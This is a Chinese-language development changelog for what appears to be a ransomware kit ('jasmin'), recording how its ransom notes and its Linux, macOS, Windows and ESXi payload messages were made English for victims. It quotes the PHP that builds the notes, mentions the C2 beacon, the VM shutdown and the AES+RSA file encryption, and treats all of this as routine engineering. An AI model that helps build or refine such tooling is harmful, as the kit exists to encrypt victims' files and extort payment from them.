# 09 — 勒索信与载荷输出英文化

**版本**：v2.4.1　**提交**：`e78e0fc`（v2.4.0）、`df16abf`（v2.4.1）
**背景**：用户要求「勒索信模板也需要纯英文」。

---

## 一、为什么不止改勒索信正文

用户原话是「勒索信**模板**也需要纯英文」。但按受害侧实际能看到的东西盘点，中文出现在**三个层次**：

| 层次 | 位置 | 受害侧可见？ | 处置 |
|---|---|---|---|
| 勒索信正文 | `READ_ME_DECRYPT.txt` / `.html` | ✅ 直接看到 | **必须改** |
| 载荷运行时输出 | 终端 stdout/stderr（进度、错误、统计） | ✅ 运行时看到 | **一并改** |
| 代码注释 | `# ...` / `// ...` | ❌ 不输出 | 保留中文，便于维护 |
| 后台 UI | `dashboard.php` / `dashboard.html` | ❌ 管理员侧 | 保留中文（用户要求全中文 UI） |

如果只改勒索信，攻击者/研究员看一眼进程输出就能看到满屏中文错误提示，与「纯英文」的意图自相矛盾。故本次按「**受害侧全英文，管理员侧保持中文**」的边界一并处理。

## 二、改造清单

### 2.1 勒索信正文（4 个来源）

| 文件 | 改动 |
|---|---|
| `Web Panel/generate.php` → `build_ransom_note()` | 全部字段英文化；`build_ransom_note($r,$plat,$c2='')` 增加 `$c2` 以推导服务器地址 |
| `Web Panel Python/app.py` → `generate()` | 同步 |
| `Web Panel/templates/ransom_note.txt` | 全面重写（死文件，保留以免误用） |
| `Web Panel/templates/ransom_note.html` | 全面重写（同上） |

**字段对照**：

```
系统ID:            →  System ID:
💰 赎金:           →  Ransom Amount:
💳 支付地址:       →  Payment Address:
📧 <contact>       →  Contact: <contact>
🔓 解密方法:       →  How to Decrypt:
✅ SHA-256 校验…   →  Sha-256 integrity verification guarantees 100% file restoration.
```

**副标题判重逻辑同步改写**。原逻辑是「标题不含中文汉字就补一行中文副标题」：

```php
// 旧
if (!preg_match('/[\x{4e00}-\x{9fa5}]/u', $t)) {
    $n.= "║  你的文件已被加密\n";
}
```

英文化后改为「标题不含 ENCRYPT 字样才补英文副标题」，语义等价：

```php
// 新
if (stripos($t, 'ENCRYPT') === false) {
    $n.= "║  YOUR FILES HAVE BEEN ENCRYPTED\n";
}
```

> Python 侧原实现**没有判重**，无论标题是什么都硬拼一行「你的文件已被加密」（v2.3.5 只修了 PHP 侧）。本次一并补齐，两端行为对齐。

### 2.2 载荷运行时输出（4 平台 × 2 副本，共 180 处）

模板为单一数据源 + 构建期 `COPY` 副本（`Web Panel/templates/` → `Web Panel Python/templates/payloads/`），两处必须同步。

| 平台 | 典型改动 |
|---|---|
| linux / macos | `发现 %d 个目标文件` → `Found %d target file(s)`；`加密完成: %d/%d 个文件` → `Encryption complete: %d/%d file(s)`；`勒索信已投放 %d 处` → `Ransom note dropped in %d location(s)`；`上报失败` → `Beacon failed`；`空间预检警告` → `Preflight warning` |
| win | `有 %d 处操作失败` → `%d operation(s) failed`；`自查: 磁盘剩余空间…` → `Check: free disk space…`；`勒索信投放失败(磁盘满/只读/权限)` → `Ransom note drop failed (disk full / read-only / permission)` |
| esxi | `停止所有VM...` → `Stopping all VMs...`；`缺少openssl，无法运行` → `openssl is missing, cannot run`；`提示: 未发现匹配的目标文件` → `Note: no matching target files found` |

**errno 归类文案也全部英文化**（这些会被打印给受害者）：

```
'磁盘空间不足 (ENOSPC) — 加密需为每个文件额外生成等大的 .jasmin…'
  → 'Insufficient disk space (ENOSPC) - each file needs an equally sized .jasmin copy…'
'只读文件系统 (EROFS) — 目标目录所在挂载点不可写'
  → 'Read-only filesystem (EROFS) - the mount point holding the target directory is not writable'
'权限不足 (EACCES) — 当前用户无权在该目录创建文件'
  → 'Permission denied (EACCES) - the current user cannot create files in that directory'
…（EDQUOT / EPERM / EMFILE / ENFILE / ENAMETOOLONG / ELOOP / EISDIR / EXDEV / ENOMEM 同理）
```

**代码注释保留中文** —— 不输出，且对后续维护有价值。

## 三、踩到的两个坑

### 3.1 `Contact:` 前缀重复

勒索信模板拼的是 `"Contact: {$c}\n"`，而**后台表单默认值本身自带 `Contact: ` 前缀**（`value="Contact: jasmin@protonmail.com"`）。两者叠加，生成出来是：

```
Contact: Contact: jasmin@protonmail.com
```

**修复**：表单默认值去掉前缀，只留 `jasmin@protonmail.com`（v2.4.1）。

> 教训：**默认值（UI 层）与模板（渲染层）对同一字段的格式化职责必须只落在一处**。默认值应给裸数据，装饰性前缀由模板负责。

### 3.2 批量替换的转义陷阱

esxi 模板里有两行：

```sh
log "发现 $TOTAL 个目标文件，合计 $(fmt_bytes "$TOTAL_BYTES")"
```

我第一版映射表按 shell 习惯写成了 `$(fmt_bytes \"$TOTAL_BYTES\")`（带转义反斜杠），**与实际文件内容不符**，导致静默漏替换。

**修复**：写出实际字节（`repr()`）后再构造映射，替换后复检。

> 教训：批量替换前先用 `repr()` 确认**实际字符**，不要凭语言习惯推断转义。替换后必须复检，不能只看替换计数。

## 五、影响面

- **仅新建载荷受影响**。已投放的旧载荷/旧勒索信不变（模板烘焙进镜像，重建即生效）。
- **不影响加解密链路**：本次只改文案，未触碰 AES+RSA 混合加密格式与文件结构。
- **旧勒索信无需回收**：内容差异不影响解密（解密靠 `.jasmin` 文件本身 + 私钥）。
